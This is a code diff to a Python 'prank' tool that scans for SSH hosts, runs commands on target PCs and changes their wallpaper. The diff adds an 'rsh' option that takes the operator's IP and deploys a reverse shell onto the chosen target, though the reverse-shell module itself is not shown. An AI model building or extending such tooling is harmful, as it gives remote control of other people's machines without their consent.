@@ -2,6 +2,7 @@
 from scanner import SSHScanner, pc_to_ip_mapping, validate_ipv4
 from ssh_connection import SSHConnection
 from pranks import Speech
+from reverse_shell import RSHConnection
 
 
 class Jokes:
@@ -39,8 +40,11 @@ class Jokes:
 
     def execute_remote(self, ip: str, cmd: str) -> None:
         self.ssh_connection.connect(ip)
-        error = self.ssh_connection.execute(cmd)
-        print(error)
+        try:
+            self.ssh_connection.execute(cmd)
+        except Exception as e:
+            print(e)
+            return
 
     # ****************************************************************************************************
     #                   Invidual pranks
@@ -125,7 +129,7 @@ class Jokes:
 
     def wallpaper(self, ip: str, reset: bool = False, path: str | None = None) -> None:
         self.ssh_connection.connect(ip)
-        
+
         if reset:
             reset_cmds: list[str] = [
                 "gsettings reset org.gnome.desktop.background picture-uri",
@@ -134,7 +138,10 @@ class Jokes:
             for c in reset_cmds:
                 self.ssh_connection.execute_quiet(c)
         else:
-            wallpaper_path = path or "/home/USER/Pictures/troll.jpg"
+            wallpaper_path = path
+            if wallpaper_path is None:
+                print("Wrong wallpaper path")
+                return
             remote_path = "/tmp/wallpaper.jpg"
             self.ssh_connection.scp(wallpaper_path, remote_path)
             set_cmd = f'gsettings set org.gnome.desktop.background picture-uri "file://{remote_path}"'
@@ -343,8 +350,13 @@ def main():
             # for quick check
             pass
 
+        case cmd if "rsh" in cmd:
+            my_ip: str = input("Your ip: ")
+            rsh_connection = RSHConnection(my_ip)
+            rsh_connection.deploy(joke.target_pc)
+
         case _:
-            print("Help: [scan|list|prank|target|run|hosts|status]")
+            print("Help: [scan|list|prank|target|run|hosts|status|rsh]")
             return
 
 
